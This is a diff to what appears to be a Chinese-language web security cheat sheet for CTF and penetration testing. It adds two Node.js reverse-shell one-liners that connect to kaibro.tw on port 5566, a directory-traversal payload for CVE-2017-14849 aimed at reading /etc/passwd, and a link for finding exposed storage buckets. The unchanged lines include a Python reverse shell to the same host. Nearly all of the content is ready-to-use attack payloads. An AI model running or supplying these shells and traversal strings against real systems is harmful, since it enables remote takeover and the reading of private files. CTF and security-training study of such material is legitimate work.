@@ -187,6 +187,9 @@ A=fl;B=ag;cat $A$B
 - Python
     - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("kaibro.tw",5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
+- Node.js
+    - `var net = require("net"), sh = require("child_process").exec("/bin/bash"); var client = new net.Socket(); client.connect(5566, "kaibro.tw", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});`
+    - `require('child_process').exec("bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'");`
 
 # PHP Tag
 
@@ -2390,6 +2393,10 @@ state[i] = state[i-3] + state[i-31]`
     - 因為`/files`沒有加上結尾`/`，而`/home/`有
     - 所以`/files../`可以訪問上層目錄
 
+- Node.js目錄穿越漏洞
+    - CVE-2017-14849
+    - 影響: 8.5.0版
+    - `/static/../../../foo/../../../../etc/passwd`
 
 - Apache Tomcat Session操縱漏洞
     - 預設session範例頁面`/examples/servlets /servlet/SessionExample`
@@ -2448,6 +2455,8 @@ state[i] = state[i-3] + state[i-31]`
 - https://github.com/drwetter/testssl.sh
 
 - https://github.com/urbanadventurer/WhatWeb
+
+- https://buckets.grayhatwarfare.com/
 
 ## Social Engineering
 
